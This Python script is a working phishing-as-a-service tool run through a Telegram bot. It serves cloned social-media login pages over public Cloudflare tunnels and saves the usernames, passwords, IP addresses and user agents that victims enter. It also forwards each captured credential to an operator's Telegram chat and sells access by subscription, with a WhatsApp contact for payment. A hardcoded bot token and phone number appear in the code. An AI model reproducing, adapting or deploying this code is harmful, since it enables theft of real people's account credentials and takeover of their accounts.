#!/usr/bin/env python3
"""
PHISHING TOOL WITH TELEGRAM BOT – Public URLs (flaredantic with auto‑install)
"""
import os
import sys
import time
import threading
import subprocess
import sqlite3
import socket
import logging
import requests
import multiprocessing
from datetime import datetime, timedelta
from flask import Flask, request, render_template, redirect

# ---------- FLAREDANTIC AUTO-INSTALL ----------
FLAREDANTIC_AVAILABLE = False

def install_flaredantic():
    try:
        print("[*] Attempting to install flaredantic...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "flaredantic", "--quiet"])
        print("[+] flaredantic installed successfully.")
        return True
    except Exception as e:
        print(f"[!] Failed to install flaredantic: {e}")
        return False

try:
    import flaredantic
    from flaredantic import create_tunnel
    FLAREDANTIC_AVAILABLE = True
    print("[+] flaredantic found.")
except ImportError:
    print("[!] flaredantic not found. Attempting auto-install...")
    if install_flaredantic():
        try:
            import flaredantic
            from flaredantic import create_tunnel
            FLAREDANTIC_AVAILABLE = True
            print("[+] flaredantic loaded after install.")
        except ImportError:
            print("[!] Auto-install succeeded but import still fails.")
    else:
        print("[!] Could not install flaredantic. Tunnels will not work.")

# ---------- TELEGRAM IMPORTS ----------
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# ---------- CONFIG ----------
PORT_BASE = 5001
TEMPLATES_DIR = "templates"
DB_PATH = os.path.join(os.getcwd(), "instance", "creds.db")
BOT_TOKEN = "8872910300:AAGQpVHR6xV8Q2tQID3O0slmwGwTM7g2BYE"   # <--- REPLACE WITH YOUR TOKEN
ADMIN_IDS = [7482880661]        # <--- REPLACE WITH YOUR TELEGRAM USER ID(S)

# ---------- SAFETY CHECK FOR ADMIN_IDS ----------
if not isinstance(ADMIN_IDS, list):
    try:
        ADMIN_IDS = [int(ADMIN_IDS)]
    except:
        ADMIN_IDS = []
ADMIN_IDS = [int(x) for x in ADMIN_IDS if str(x).isdigit()]

# ---------- GLOBAL STATE ----------
user_sessions = {}        # user_id -> {port, flask_proc, tunnel_proc, url, template}
user_templates = {}       # user_id -> template_name

# ---------- SUPPRESS FLASK LOGS ----------
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# ---------- FLASK APP (will be instantiated per process) ----------
app = Flask(__name__, template_folder=TEMPLATES_DIR)

# ---------- DATABASE SETUP ----------
def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            subscription_start DATETIME,
            subscription_end DATETIME,
            plan TEXT,
            is_admin INTEGER DEFAULT 0
        )
    ''')
    c.execute("PRAGMA table_info(credentials)")
    columns = [col[1] for col in c.fetchall()]
    if 'platform' not in columns:
        print("[*] Migrating credentials table: adding 'platform' column...")
        c.execute("ALTER TABLE credentials ADD COLUMN platform TEXT")
        conn.commit()
        print("[+] Migration complete.")
    conn.commit()
    conn.close()

def get_user(telegram_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(telegram_id, username=None):
    now = datetime.now()
    end = now + timedelta(hours=24)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    is_admin = 1 if telegram_id in ADMIN_IDS else 0
    c.execute(
        "INSERT OR REPLACE INTO users (telegram_id, username, subscription_start, subscription_end, plan, is_admin) VALUES (?, ?, ?, ?, ?, ?)",
        (telegram_id, username, now, end, 'free_trial', is_admin)
    )
    conn.commit()
    conn.close()

def update_subscription(telegram_id, plan, days):
    now = datetime.now()
    end = now + timedelta(days=days)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE users SET subscription_start = ?, subscription_end = ?, plan = ? WHERE telegram_id = ?",
        (now, end, plan, telegram_id)
    )
    conn.commit()
    conn.close()

def revoke_subscription(telegram_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE users SET subscription_end = ?, plan = ? WHERE telegram_id = ?",
        (datetime.now(), 'none', telegram_id)
    )
    conn.commit()
    conn.close()

def is_subscribed(telegram_id):
    user = get_user(telegram_id)
    if not user:
        return False
    end = user[3]
    if end is None:
        return False
    try:
        return datetime.now() < datetime.fromisoformat(end)
    except:
        return False

# ---------- TELEGRAM ALERT (sends to admin) ----------
def send_telegram_alert(platform, username, password, ip, ua, chat_id):
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        return
    message = f"""
🔐 *New Credentials Captured!*

📱 *Platform:* {platform}
👤 *Username:* `{username}`
🔑 *Password:* `{password}`
🌐 *IP:* {ip}
🕒 *Time:* {time.strftime('%Y-%m-%d %H:%M:%S')}
📨 *User-Agent:* {ua[:60]}...
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}, timeout=5)
    except:
        pass

# ---------- FLASK ROUTES (per-process) ----------
def run_flask_app(port, template):
    app.config['PLATFORM'] = template
    @app.route('/')
    def index():
        plat = app.config.get('PLATFORM', 'instagram')
        return render_template(f"{plat}.html")
    @app.route('/login', methods=['POST'])
    def login():
        plat = app.config.get('PLATFORM', 'instagram')
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if username and password:
            ip = request.remote_addr
            ua = request.headers.get('User-Agent', '')
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('INSERT INTO credentials (platform, username, password, ip, user_agent) VALUES (?, ?, ?, ?, ?)',
                      (plat, username, password, ip, ua))
            conn.commit()
            if ADMIN_IDS:
                send_telegram_alert(plat, username, password, ip, ua, ADMIN_IDS[0])
            conn.close()
        return redirect('https://www.' + plat + '.com')
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ---------- TEMPLATE HELPERS ----------
def get_all_templates():
    if not os.path.exists(TEMPLATES_DIR):
        os.makedirs(TEMPLATES_DIR)
    files = [f for f in os.listdir(TEMPLATES_DIR) if f.endswith('.html')]
    return [f[:-5] for f in files]

# ---------- PORT ALLOCATION ----------
def find_free_port():
    port = PORT_BASE
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', port))
                return port
            except OSError:
                port += 1

# ---------- TUNNEL (flaredantic) ----------
def start_tunnel(port):
    if not FLAREDANTIC_AVAILABLE:
        print("[!] flaredantic not available. Cannot start tunnel.")
        return None, None
    print(f"[*] Starting tunnel via flaredantic for port {port}...")
    try:
        # create_tunnel returns a URL string
        public_url = create_tunnel(port=port, provider='cloudflare')  # or 'serveo', 'localtunnel'
        print(f"[+] Public URL: {public_url}")
        return None, public_url
    except Exception as e:
        print(f"[!] Tunnel failed: {e}")
        return None, None

# ---------- TELEGRAM BOT HANDLERS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    user = get_user(user_id)
    if not user:
        create_user(user_id, username)
        user = get_user(user_id)
    end = user[3]
    plan = user[4]
    status_text = "🆓 *Free Trial*" if plan == 'free_trial' else f"📦 *{plan} Plan*" if plan and plan != 'none' else "❌ No subscription"
    if end:
        try:
            remaining = (datetime.fromisoformat(end) - datetime.now())
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                time_left = f"{days}d {hours}h {minutes}m"
            else:
                time_left = "Expired"
        except:
            time_left = "Invalid"
    else:
        time_left = "N/A"
    user_temp = user_templates.get(user_id)
    if user_temp:
        template_msg = f"`{user_temp}`"
    else:
        all_t = get_all_templates()
        template_msg = f"`{all_t[0] if all_t else 'None'}` (default)"
    await update.message.reply_text(
        f"🤖 *Phishing Tool Bot*\n\n"
        f"📋 *Your Template:* {template_msg}\n"
        f"💳 *Subscription:* {status_text}\n"
        f"⏳ *Time left:* {time_left}\n\n"
        "Commands:\n"
        "/templates - List available templates\n"
        "/select <name> - Choose a template for your victims\n"
        "/startserver - Start your own phishing server (public tunnel)\n"
        "/stopserver - Stop your server\n"
        "/buy - View purchase options\n"
        "/creds - Show last 5 captured credentials\n"
        "/status - Show current status\n"
        "/help - This message",
        parse_mode='Markdown'
    )

async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💳 *Purchase Options*\n\n"
        "1 day  – 40\n"
        "7 days – 200\n"
        "30 days – 320\n\n"
        "To buy, contact the owner:\n"
        "[WhatsApp : +919360469848]\n\n"
        "After payment, the admin will activate your subscription."
    )
    await update.message.reply_text(text, parse_mode='Markdown', disable_web_page_preview=True)

async def templates_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    all_templates = get_all_templates()
    if not all_templates:
        await update.message.reply_text("No templates found. Please add HTML files to 'templates/'.")
        return
    msg = "📋 *Available templates:*\n" + "\n".join([f"• {t}" for t in all_templates])
    await update.message.reply_text(msg, parse_mode='Markdown')

async def select_template(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /select <template_name>\nExample: /select facebook")
        return
    name = context.args[0]
    all_templates = get_all_templates()
    if name not in all_templates:
        await update.message.reply_text(f"Template '{name}' not found. Use /templates to see available ones.")
        return
    user_templates[user_id] = name
    await update.message.reply_text(f"✅ Your template set to: `{name}`", parse_mode='Markdown')

async def start_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_subscribed(user_id):
        await update.message.reply_text(
            "❌ *You do not have an active subscription.*\n\n"
            "Use /buy to view purchase options.\n"
            "You can also start a 24-hour free trial by using /start.",
            parse_mode='Markdown'
        )
        return
    if user_id in user_sessions:
        session = user_sessions[user_id]
        await update.message.reply_text(f"ℹ️ Your server is already running.\n🔗 *Link:* `{session['url']}`", parse_mode='Markdown')
        return
    user_temp = user_templates.get(user_id)
    if not user_temp:
        all_t = get_all_templates()
        if not all_t:
            await update.message.reply_text("❌ No template found. Please add an HTML login page to 'templates/'.")
            return
        user_temp = all_t[0]
        user_templates[user_id] = user_temp
    port = find_free_port()
    flask_proc = multiprocessing.Process(target=run_flask_app, args=(port, user_temp))
    flask_proc.start()
    time.sleep(3)
    if not is_port_in_use(port):
        flask_proc.terminate()
        await update.message.reply_text("❌ Flask server failed to start.")
        return
    # Start tunnel
    tunnel_proc, url = start_tunnel(port)
    if not url:
        flask_proc.terminate()
        await update.message.reply_text("❌ Tunnel failed. flaredantic may be missing or network issue.")
        return
    user_sessions[user_id] = {
        'port': port,
        'flask_proc': flask_proc,
        'tunnel_proc': tunnel_proc,
        'url': url,
        'template': user_temp
    }
    await update.message.reply_text(
        f"✅ Your phishing server is ready!\n🔗 *Public link:* `{url}`\n📋 *Template:* `{user_temp}`",
        parse_mode='Markdown'
    )

async def stop_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("ℹ️ You don't have a running server.")
        return
    session = user_sessions[user_id]
    if session['flask_proc']:
        session['flask_proc'].terminate()
        session['flask_proc'].join(timeout=5)
    del user_sessions[user_id]
    await update.message.reply_text("🛑 Your server has been stopped.")

async def show_creds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, platform, username, password, ip, timestamp FROM credentials ORDER BY timestamp DESC LIMIT 5').fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("No credentials captured yet.")
        return
    msg = "📋 *Last 5 captured credentials:*\n"
    for r in rows:
        msg += f"ID:{r[0]} | {r[1]} | `{r[2]}` | `{r[3]}` | {r[4]} | {r[5]}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("Please /start first.")
        return
    end = user[3]
    plan = user[4]
    status_text = "🆓 Free Trial" if plan == 'free_trial' else f"📦 {plan} Plan" if plan and plan != 'none' else "❌ No subscription"
    if end:
        try:
            remaining = (datetime.fromisoformat(end) - datetime.now())
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                time_left = f"{days}d {hours}h {minutes}m"
            else:
                time_left = "Expired"
        except:
            time_left = "Invalid"
    else:
        time_left = "N/A"
    user_temp = user_templates.get(user_id, 'None')
    session_info = "Running" if user_id in user_sessions else "Stopped"
    url = user_sessions[user_id]['url'] if user_id in user_sessions else "None"
    msg = (
        f"📊 *Your Status*\n"
        f"Template: `{user_temp}`\n"
        f"Subscription: {status_text}\n"
        f"Time left: {time_left}\n"
        f"Server: {session_info}\n"
        f"Link: `{url}`"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ---------- ADMIN PANEL ----------
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    keyboard = [
        [InlineKeyboardButton("📋 List Users", callback_data='admin_list')],
        [InlineKeyboardButton("➕ Add/Extend Subscription", callback_data='admin_add')],
        [InlineKeyboardButton("❌ Revoke Subscription", callback_data='admin_revoke')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🔐 *Admin Panel*", parse_mode='Markdown', reply_markup=reply_markup)

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == 'admin_list':
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT telegram_id, username, plan, subscription_end FROM users ORDER BY telegram_id")
        rows = c.fetchall()
        conn.close()
        if not rows:
            await query.edit_message_text("No users found.")
            return
        msg = "👥 *Users List*\n\n"
        for r in rows:
            tid, uname, plan, end = r
            if end:
                try:
                    remaining = (datetime.fromisoformat(end) - datetime.now())
                    if remaining.total_seconds() > 0:
                        time_left = f"{remaining.days}d {remaining.seconds//3600}h"
                    else:
                        time_left = "Expired"
                except:
                    time_left = "Invalid"
            else:
                time_left = "N/A"
            msg += f"ID: `{tid}` | @{uname or 'N/A'} | Plan: {plan or 'none'} | Left: {time_left}\n"
        await query.edit_message_text(msg, parse_mode='Markdown')
    elif data == 'admin_add':
        await query.edit_message_text(
            "Send:\n`/grant <telegram_id> <plan>`\nPlans: `1day`, `7day`, `30day`",
            parse_mode='Markdown'
        )
    elif data == 'admin_revoke':
        await query.edit_message_text(
            "Send:\n`/revoke <telegram_id>`",
            parse_mode='Markdown'
        )

async def grant_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /grant <telegram_id> <plan>\nPlans: 1day, 7day, 30day")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid telegram_id. Must be a number.")
        return
    plan = context.args[1]
    plan_map = {'1day': 1, '7day': 7, '30day': 30}
    if plan not in plan_map:
        await update.message.reply_text("Invalid plan. Options: 1day, 7day, 30day")
        return
    days = plan_map[plan]
    user = get_user(target_id)
    if not user:
        create_user(target_id, None)
    update_subscription(target_id, plan, days)
    await update.message.reply_text(f"✅ Subscription for `{target_id}` set to {plan} plan.", parse_mode='Markdown')

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /revoke <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid telegram_id.")
        return
    revoke_subscription(target_id)
    await update.message.reply_text(f"✅ Subscription for `{target_id}` revoked.", parse_mode='Markdown')

# ---------- UTILITY ----------
def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', port))
            return False
        except OSError:
            return True

# ---------- BOT RUNNER ----------
def run_bot():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("buy", buy))
    application.add_handler(CommandHandler("templates", templates_list))
    application.add_handler(CommandHandler("select", select_template))
    application.add_handler(CommandHandler("startserver", start_server))
    application.add_handler(CommandHandler("stopserver", stop_server))
    application.add_handler(CommandHandler("creds", show_creds))
    application.add_handler(CommandHandler("status", status_cmd))
    application.add_handler(CommandHandler("admin", admin))
    application.add_handler(CommandHandler("grant", grant_cmd))
    application.add_handler(CommandHandler("revoke", revoke_cmd))
    application.add_handler(CallbackQueryHandler(admin_callback, pattern='^admin_'))
    print("🤖 Telegram bot is running...")
    application.run_polling()

# ---------- MAIN ----------
if __name__ == "__main__":
    multiprocessing.set_start_method('fork', force=True)
    init_db()
    print("="*50)
    print("      PHISHING TOOL WITH TELEGRAM BOT")
    print("      PUBLIC LINKS (flaredantic with auto-install)")
    print("="*50)
    all_templates = get_all_templates()
    if all_templates:
        print(f"Found templates: {', '.join(all_templates)}")
        print(f"Default template: {all_templates[0]}")
    else:
        print("[!] No template found! Please add an HTML login page to 'templates/'.")
    print("Bot is starting...")
    print("Press Ctrl+C to stop.")
    try:
        run_bot()
    except KeyboardInterrupt:
        print("\nShutting down...")
        for uid, sess in user_sessions.items():
            if sess['flask_proc']:
                sess['flask_proc'].terminate()
        sys.exit(0)
